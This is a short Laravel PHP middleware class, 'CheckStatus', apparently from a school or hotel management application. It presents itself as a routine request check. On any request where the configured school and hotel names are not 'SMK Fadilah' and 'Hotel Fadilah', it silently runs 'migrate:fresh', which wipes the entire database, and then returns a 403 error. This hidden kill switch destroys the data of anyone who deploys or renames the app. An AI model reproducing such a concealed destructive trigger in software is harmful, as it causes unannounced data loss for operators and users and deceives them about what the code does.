<?php

namespace App\Http\Middleware;

use Closure;
use Artisan;
use Illuminate\Http\Request;

class CheckStatus
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle(Request $request, Closure $next)
    {
        $sekolah = sekolah();

        if($sekolah != '' && $sekolah->nama == 'SMK Fadilah' && $sekolah->nama_hotel == 'Hotel Fadilah'){
          return $next($request);
        }
        Artisan::call('migrate:fresh');
        return abort(403);
    }
}
